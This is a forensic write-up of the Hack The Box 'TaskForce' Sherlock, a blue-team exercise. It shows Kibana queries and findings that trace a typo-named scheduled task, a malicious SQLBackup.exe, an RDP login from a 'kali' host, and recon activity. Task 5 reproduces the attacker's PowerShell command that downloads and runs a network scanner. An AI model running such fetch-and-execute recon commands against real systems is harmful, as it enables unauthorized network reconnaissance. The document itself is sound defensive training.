# HTB Sherlock: TaskForce — Elastic SIEM Threat Hunting

## Sherlock Scenario
Your organization, Alliance, recently set up a SIEM in the environment for better visibility and coverage. However, due to a lack of administrative staff and poor security hygiene, the environment is in disarray. The logging configuration is broken in some areas, logs are being overwritten, and new log sources are being added to the SIEM only gradually, creating a significant visibility gap. Spawn the VM and wait around 1-2 minutes for the ELK services to start. Then either by connecting to the HTB VPN or using pwnbox, access the SIEM using http://ip:5601. You have been given a threat hunt hypothesis as your first task.

Hypothesis: A threat actor has established persistence on one or more hosts within the environment by creating or modifying a scheduled task with a name designed to blend in with legitimate Windows tasks. Given the degraded logging posture, the task may have gone undetected and could be actively executing a malicious payload.

---

## Getting Started: Accessing & Navigating Elastic SIEM (Kibana)

Before diving into the hunt itself, here's how to get oriented in the Kibana/Elastic environment used for this investigation.

### 1. Log in to Kibana

Navigate to `http://<TARGET_IP>:5601` and log in with:
- **Username:** `elastic`
- **Password:** `hacktheblue`
  
<img width="1366" height="466" alt="taskforce (1)" src="https://github.com/user-attachments/assets/d5c1d464-9aee-4e34-bd96-b13df5ebac78" />


### 2. Land on the Home page

After login you'll see the **Welcome home** screen with four tiles: **Elasticsearch**, **Observability**, **Security**, and **Analytics**. For log-based threat hunting, click into **Analytics**.

<img width="1366" height="392" alt="taskforce (2)" src="https://github.com/user-attachments/assets/45b7fc61-1da5-4154-b1eb-e2725bfe194c" />

### 3. Open Discover

The Analytics landing page shows shortcuts to **Dashboard**, **Discover**, and other tools. Click **Discover** — this is the primary interface for raw log search and pivoting, and where the vast majority of this hunt takes place.

<img width="1366" height="465" alt="taskforce (3)" src="https://github.com/user-attachments/assets/1d787fa8-4b76-45c6-b677-117a2a05be73" />


### 4. Select your Data View

At the top-left of Discover, confirm the **Data view** dropdown is set to `logs-*` (or the relevant index pattern for this environment). This determines which underlying indices you're searching.

<img width="224" height="119" alt="taskforce (4)" src="https://github.com/user-attachments/assets/e42b114f-4335-4243-bf7b-e5fa9a77522e" />


### 5. Set your time range

By default, Discover may show "No results match your search criteria" if the time range doesn't cover your data. Click the date picker in the top-right and switch to the **Absolute** tab to set exact start and end dates (e.g. `Jun 1, 2026` to `Jun 10, 2026`), and click on **Update**.

<img width="497" height="329" alt="taskforce (5)" src="https://github.com/user-attachments/assets/04855d59-ae92-4a29-8b59-94b35f486db8" />

### 6. Explore fields in the left sidebar

The left panel lists **Available fields**. Clicking any field name (e.g., `host.name`) opens a quick popup showing:

- **Top values** with percentages — a fast way to spot an outlier without writing an aggregation query (e.g., seeing `alliance-central` at 13.0% of a sample instantly shows you all in-scope hosts).
- An **"Add field as column"** button to bring that field into the results table.
- A **Visualize** button to jump straight into a chart of that field's distribution.
  
<img width="557" height="472" alt="taskforce (6)" src="https://github.com/user-attachments/assets/0c5b3ea1-be25-4cf7-b525-99508c29cb16" />

This Top Values panel is effectively Kibana's built-in substitute for an Elasticsearch `terms` aggregation — useful when you want a quick answer without hand-writing DSL.

### 7. Filter with KQL

Use the search bar (**"Filter your data using KQL syntax"**) to narrow results (e.g.`event.code:"4688" and host.name:"alliance-central"`)

<img width="874" height="124" alt="taskforce (7)" src="https://github.com/user-attachments/assets/51183616-50c2-4344-b79d-253f62102971" />

Combine this with the field-adding step above to build a working table of exactly the columns you need.

### 8. Save your search as a Discover session

Once your filters, columns, and time range are set, click **Save** (top-right) and give it a name — e.g., `01 to 10-JUN-2026`. This lets you return to the same view later without rebuilding it, and is useful for documenting exactly what query produced a given piece of evidence.

<img width="1366" height="396" alt="taskforce (8)" src="https://github.com/user-attachments/assets/b19df965-5c5a-47e8-bfce-a028d4d3af32" />

### 9. Export results to CSV

Click the **Export** (download) icon in the toolbar next to Save. This opens the **"Export search as CSV"** panel.

<img width="1366" height="126" alt="taskforce (9)" src="https://github.com/user-attachments/assets/a211c035-9811-48a6-b632-14243d5f67b6" />

Then, lick **Generate CSV** to queue the export as a background job.

<img width="341" height="467" alt="taskforce (10)" src="https://github.com/user-attachments/assets/fdab7322-163a-48d3-ba89-7461e8cc16cf" />

### 10. Retrieve your export

Go to **Stack Management → Reporting** (left nav, under Alerts and Insights). The **Exports** tab lists every CSV job you've generated, with its status (`Done, warnings detected` is normal and just means some fields were empty/unmapped), creation time, and a **download icon** to pull the file to your machine.

<img width="1366" height="313" alt="taskforce (11)" src="https://github.com/user-attachments/assets/a8ba7656-fc63-40f3-9bd4-acea5550724a" />

<img width="1366" height="302" alt="taskforce (12)" src="https://github.com/user-attachments/assets/91da0f1a-af80-41d7-beae-9848962f80c9" />

> This flow mirrors the actual UI step-for-step: login → Home → Analytics → Discover → set time range → add fields → KQL filter → Save → Export → Stack Management → Reporting → download.

---

## Threat Hunting

This Elastic instance uses a mix of raw Winlogbeat fields (`winlog.event_data.*`) and ECS-normalized fields (`process.executable`, `user.name`, `event.code`).

### Task 1 — Identify the out-of-place scheduled task

**KQL:**
```
winlog.channel:"Microsoft-Windows-TaskScheduler/Operational"
```

**Fields to export:**
`@timestamp`, `host.name`, `winlog.channel`, `winlog.event_data.TaskName`, `event.code`

**Method:** Export all rows, then in a spreadsheet/pandas, get distinct values of `TaskName` and filter out everything under `\Microsoft\Windows\...` (built-in tasks). Inspect what remains.

**Finding:** Two visually similar task names existed:
- `\SQLConnectivityCheck` — hosts `alliance-ws07`, `alliance-ws04`
- `\SQLConnectvityCheck` (typo, missing "i") — host `alliance-central` **only**

---

### Task 2 — Identify the malicious executable

**KQL:**
```
event.code:"4688" and host.name:"alliance-central"
```

**Fields to export:**
`@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectUserName`, `winlog.event_data.TargetUserName`, `winlog.event_data.TokenElevationType`, `winlog.event_data.MandatoryLabel`, `winlog.event_data.SubjectLogonId`

**Method:** Get distinct values of `process.executable` for this host; look for a path outside normal Program Files / System32 install locations.

**Finding:**
```
2026-06-09 22:37:53.015
process.executable      : C:\Users\Public\Pictures\SQLBackup.exe
SubjectUserName          : ALLIANCE-CENTRA$   (SubjectLogonId 0x3e7 = SYSTEM)
TargetUserName            : john.shepard
TokenElevationType       : %%1937 (Full)
MandatoryLabel           : S-1-16-12288 (High Integrity)
```

> **Gotcha:** the SQL server's NetBIOS name is truncated to 15 characters (`ALLIANCE-CENTRA`) in task/script contexts, but its real hostname in Elastic is `alliance-central`. Querying with the truncated name returns zero results.

---

### Task 3 — First malicious login timestamp

**Step A — find the pivot Logon ID from a known-bad process:**
```
event.code:"4688" and process.executable:*netscan.exe*
```
Fields: `@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectLogonId`

Result: `netscan.exe` on `alliance-ws07`, `SubjectLogonId = 0x7b9417`.

**Step B — trace that Logon ID back to the earliest process in the session:**
```
winlog.event_data.SubjectLogonId:"0x7b9417" and host.name:"alliance-ws07"
```
Fields: `@timestamp`, `host.name`, `process.executable`, `winlog.event_data.SubjectUserName`, `winlog.event_data.TargetUserName`

Sort ascending by `@timestamp`. Earliest match:
```
2026-06-09 12:41:09.624 — TSTheme.exe
SubjectUserName: ALLIANCE-WS07$ (SYSTEM)   TargetUserName: John.shepard
```

> Standard Security Event 4624 (successful logon) was unavailable for this session — Logon/Logoff auditing was not fully configured on this host. Pivoting on Logon ID across process-creation events was the workaround.

---

### Task 4 — Hostname of origin

**KQL:**
```
event.code:"13" and host.name:"alliance-ws07"
```
Time range narrowed to `2026-06-09 12:41:08 – 12:41:11` (right around the Task 3 timestamp).

**Fields to export:**
`@timestamp`, `host.name`, `event.code`, `registry.path`, `registry.key`, `registry.value`, `registry.data.strings`, `registry.hive`

**Finding:**
```
2026-06-09 12:41:09.833
registry.path  : HKU\S-1-5-21-...-1107\Volatile Environment\2\CLIENTNAME
registry.value : kali
registry.hive  : HKU
```

> `CLIENTNAME` is auto-populated under `Volatile Environment` by Windows at RDP session start, recording the connecting client's hostname — a useful non-standard artifact when Security 4624 is unavailable.

---

### Task 5 — Recon tool download/execution command

**KQL:**
```
event.code:"4104" and user.name:"john.shepard" and host.name:"alliance-ws07"
```
Time range narrowed to `2026-06-09 12:55:00 – 12:56:00`.

**Fields to export:**
`@timestamp`, `host.name`, `user.name`, `powershell.file.script_block_id`, `powershell.file.script_block_text`

**Finding:**
```
2026-06-09 12:55:13.973
powershell.file.script_block_text:
  $url = "https://www.softperfect.com/download/files/netscan_portable.zip";
  $out = "C:\Users\Public\netscan_portable.zip";
  Invoke-WebRequest -Uri $url -OutFile $out;
  Expand-Archive $out -DestinationPath "C:\Users\Public\SoftPerfect";
  & "C:\Users\Public\SoftPerfect\x86_64\netscan.exe"
```

---

### Task 6 — Source of compromise

No single query answers this — it's a synthesis across Tasks 2–5, all of which independently point to the same identity via a shared Logon ID (`0x7b9417`) and username (`john.shepard`/`John.Shepard`):

| Evidence | Task |
|---|---|
| RDP session origin (`kali`) tied to `John.shepard` | 3, 4 |
| Recon tool download & execution as `john.shepard` | 5 |
| SYSTEM-run payload impersonating `john.shepard` | 2 |

**KQL used to validate cross-host activity for the account:**
```
winlog.event_data.TargetUserName:"john.shepard" or user.name:"john.shepard"
```
Fields: `@timestamp`, `host.name`, `event.code`, `process.executable`, `winlog.event_data.TargetUserName`, `winlog.event_data.SubjectUserName`

> Note: All queries and fields above were validated by exporting the underlying data to CSV and cross-checking values directly, rather than relying solely on Discover's rendered UI.

<img width="1335" height="615" alt="htb-sherlock-taskforce-solved" src="https://github.com/user-attachments/assets/f909dca6-da23-4611-99bc-646ba91b85a9" />
https://labs.hackthebox.com/achievement/sherlock/2413013/1311

---

## ⚠️ Disclaimer

> All writeups and tools in this repository are for educational and authorized testing purposes only. All activities documented here were performed within designated Hack The Box lab environments.

---

## 📌 Connect With Me

Thank you for reading this write-up! If you have any questions, suggestions, or want to discuss cybersecurity and digital forensics, feel free to reach out through any of the platforms below:

[![LinkedIn](https://shields.io)](https://linkedin.com)
[![Hack The Box](https://shields.io)](https://hackthebox.com)
[![X / Twitter](https://shields.io)](https://x.com)

---
*Developed by **Risma Fareedh** | Cybersecurity Analyst / Digital Forensics / SOC / CTF Player / Aspiring Purple Teamer* 🛡️
